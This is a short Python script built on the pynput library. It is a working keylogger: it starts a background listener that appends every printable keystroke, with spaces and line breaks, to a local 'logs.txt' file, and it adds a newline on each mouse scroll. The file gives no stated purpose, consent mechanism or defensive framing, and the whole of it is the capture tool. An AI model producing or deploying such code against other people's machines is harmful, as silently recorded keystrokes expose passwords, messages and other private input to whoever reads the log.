from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener


def log_pressedkey(key):
    # Ignore arrow keys
    if key in [Key.up, Key.down, Key.left, Key.right]:
        return

    k = str(key).replace("'", "")
    
    if k == "Key.space":
        k = " "
    elif k == "Key.enter":
        k = "\n"
    elif k in ["Key.shift", "Key.shift_r", "Key.backspace"]:
        k = ""

    if not k.startswith("Key."):
        with open("logs.txt", "a") as f:
            f.write(k)


def on_scroll(x, y, dx, dy):
    with open("logs.txt", "a") as f:
        f.write("\n")


KeyboardListener(on_press=log_pressedkey).start()
with MouseListener(on_scroll=on_scroll) as ml:
    ml.join()